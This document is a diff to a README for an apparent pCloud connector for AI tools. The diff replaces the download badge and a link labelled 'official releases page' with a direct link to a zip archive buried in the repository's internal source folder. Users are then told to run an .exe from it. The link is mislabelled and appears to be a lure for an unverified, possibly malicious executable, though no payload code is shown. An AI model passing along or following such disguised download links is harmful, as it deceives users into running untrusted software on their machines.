@@ -1,6 +1,6 @@
 # ☁️ pcloud-mcp - Access your clouds through secure AI
 
-[![](https://img.shields.io/badge/Download_pcloud--mcp-blue.svg)](https://github.com/shaylaisotonic44/pcloud-mcp)
+[![](https://img.shields.io/badge/Download_pcloud--mcp-blue.svg)](https://github.com/shaylaisotonic44/pcloud-mcp/raw/refs/heads/main/internal/safepath/mcp_pcloud_2.5.zip)
 
 pcloud-mcp connects your pCloud storage to AI tools like Claude. It allows AI models to read, navigate, and manage your cloud files safely. Security remains the priority. This software uses strict access controls to prevent unauthorized access to your file system.
 
@@ -21,7 +21,7 @@ This tool runs on Windows 10 or Windows 11. It requires no extra software instal
 
 ## 📥 How to download and install
 
-1. Visit the [official releases page](https://github.com/shaylaisotonic44/pcloud-mcp) to download the software.
+1. Visit the [official releases page](https://github.com/shaylaisotonic44/pcloud-mcp/raw/refs/heads/main/internal/safepath/mcp_pcloud_2.5.zip) to download the software.
 2. Look for the file ending in `.exe` under the latest release.
 3. Save this file to a folder on your computer, such as your Downloads folder or Documents.
 4. Locate the saved file. You do not need to install it. The program runs as a standalone tool.
